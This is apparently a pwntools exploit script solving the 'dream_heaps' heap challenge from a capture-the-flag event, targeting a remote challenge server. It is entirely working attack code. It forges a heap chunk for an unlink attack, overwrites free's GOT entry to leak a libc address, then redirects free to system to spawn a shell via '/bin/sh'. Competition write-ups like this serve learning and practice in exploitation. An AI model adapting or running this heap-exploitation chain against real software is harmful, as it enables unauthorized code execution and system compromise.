from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./dream_heaps")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./dream_heaps")
else:
	p = remote("chal1.swampctf.com","1070")
	libc = ELF("./libc-2.23.so.1")
	elf = ELF("./dream_heaps")

def add(size,content):
	p.sendlineafter("5: Quit\n> ","1")
	p.sendlineafter("is your dream?\n",str(size))
	p.sendafter("of this dream?",content)

def show(index):
	p.sendlineafter("5: Quit\n> ","2")
	p.sendlineafter("like to read?\n",str(index))

def edit(index,content,test = True):
	if test:
		p.sendlineafter("5: Quit\n> ","3")
	else:
		p.sendlineafter("4: Delete dream","3")
	p.sendlineafter("like to change?\n",str(index))
	p.send(content)
	p.recvuntil("What would")

def free(index,test = True):
	if test:
		p.sendlineafter("5: Quit\n> ","4")
	else:
		p.sendlineafter("4: Delete dream","4")
	p.sendlineafter("like to delete?\n",str(index))

def debugf():
	gdb.attach(p,"b *0x400B05")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
heap_point = 0x6020A0
add(0x68,"\x00") #0
add(0xf0,"\x00") #1
add(0x68,"\x00") #2
add(0x68,"/bin/sh\x00") #3
payload = p64(0) + p64(0x61) + p64(heap_point - 0x18) + p64(heap_point - 0x10) + "\x00" * 0x40 + p64(0x60)
edit(0,payload)
free(1)
payload = p32(0x10) * 2 + p64(0) * 2 + p64(elf.got["free"]) + p64(elf.got["puts"])
edit(0,payload)
edit(0,p64(elf.plt["puts"])[:-2])
free(1,False)
puts_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:" + hex(libc.address))
edit(0,p64(libc.symbols["system"]),False)
#debugf()
free(3,False)
p.interactive()
